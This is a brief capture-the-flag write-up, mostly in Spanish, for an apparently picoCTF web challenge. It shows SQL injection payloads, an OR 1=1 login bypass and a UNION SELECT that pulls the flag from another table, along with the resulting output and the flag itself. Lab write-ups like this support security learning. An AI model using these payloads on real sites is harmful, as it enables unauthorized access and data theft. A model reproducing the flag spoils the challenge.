
## Descripción

Can you find the flag on this website.
Additional details will be available after launching your challenge instance.

Hints:
1. SQLiLite

## Solución 

~~~

username: admin
password: 1234
SQL query: SELECT id FROM users WHERE password = '1234' AND username = 'admin'

SQL query: SELECT id FROM users WHERE password = '1234' OR 1=1; ' AND username = 'admin'


Welcome

 ' union select 1,id, flag from more_table;
### Search Office
~~~

|City|Address|Phone|
|---|---|---|
|1|1|picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}|
|1|2|If you are here, you must have seen it|

~~~
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}
~~~
## Notas adicionales 

Aprovechamos una inyección SQL para manipular consultas dentro del sitio. 

## Referencias

